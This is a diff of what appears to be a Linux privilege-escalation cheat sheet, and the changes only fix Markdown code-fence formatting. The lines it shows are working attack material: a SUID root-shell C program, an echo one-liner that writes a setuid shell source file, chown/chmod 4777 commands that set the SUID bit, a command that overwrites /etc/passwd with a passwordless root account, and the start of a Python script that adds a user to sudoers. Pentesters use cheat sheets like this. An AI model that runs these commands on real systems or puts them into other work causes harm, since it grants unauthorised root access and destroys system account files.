@@ -294,14 +294,17 @@ $ /usr/bin/foo
     It works  
     
 Generating SUID C Shell for /bin/bash
-```int main(void){
+```
+int main(void){
      setresuid(0, 0, 0);
      system("/bin/bash");
 } 
  ```
  Without interactive shell
  
- ```echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' > setuid.c```
+ ```
+ echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' > setuid.c
+ ```
  
  If you can get root to execute anything, the following will change a binary owner to him and set the SUID flag:   
  `chown root:root /tmp/setuid;chmod 4777 /tmp/setuid;`
@@ -310,7 +313,8 @@ Generating SUID C Shell for /bin/bash
  `echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd; su`
  
  Add user to sudoers in python   
- ```#!/usr/bin/env python
+ ```
+ #!/usr/bin/env python
 import os
 import sys
 try:
